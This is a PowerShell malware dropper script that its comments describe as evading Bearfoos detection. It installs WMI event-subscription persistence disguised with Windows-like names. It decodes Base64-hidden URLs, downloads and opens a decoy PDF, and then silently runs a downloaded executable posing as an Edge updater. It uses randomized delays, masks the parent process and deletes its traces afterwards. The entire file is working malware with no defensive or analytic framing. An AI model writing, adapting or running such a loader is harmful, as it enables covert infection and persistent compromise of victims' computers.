# launcher.ps1 - Bearfoos evasion + Persistence (WMI Event Subscription)
$ErrorActionPreference = 'SilentlyContinue'

# === PERSISTENCE: Install once (WMI Event Subscription) ===
# This runs at every user logon, re-launching this script
$filterName = "WindowsEventFilter"
$consumerName = "WindowsEventConsumer"
$exists = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue
if (-not $exists) {
    # Create event filter (triggers on explorer.exe startup)
    $filterArgs = @{
        Name = $filterName
        EventNameSpace = 'root\cimv2'
        QueryLanguage = 'WQL'
        Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
    }
    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
    
    # Create consumer that runs this same script
    $scriptPath = $MyInvocation.MyCommand.Path
    $consumerArgs = @{
        Name = $consumerName
        CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    }
    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
    
    # Bind filter to consumer
    $bindingArgs = @{
        Filter = $filter
        Consumer = $consumer
    }
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs
}

# === ORIGINAL BEARFOOS-EVASIVE LOADER (same as before) ===
# Random initial delay (2-8 seconds)
Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)

# Use a less monitored folder
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { 
    New-Item -ItemType Directory -Path $cache -Force | Out-Null 
}

# Base64 encoded URLs
$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

# Download PDF
$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
try {
    Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
} catch {}

# Random delay between downloads (1.5-4 seconds)
Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)

# Download EXE
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
} catch {}

# Open PDF decoy
try { Start-Process $pdfPath } catch {}

# CRITICAL: Long delay before launching EXE (45-90 seconds)
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# Launch EXE via WScript.Shell (parent becomes explorer.exe)
try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("`"$exePath`"", 0, $false)
} catch {
    Start-Process $exePath -WindowStyle Hidden
}

# Clean up EXE after 5 minutes (optional)
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 300
    Remove-Item -Path $args[0] -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $args[1] -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath, $pdfPath | Out-Null
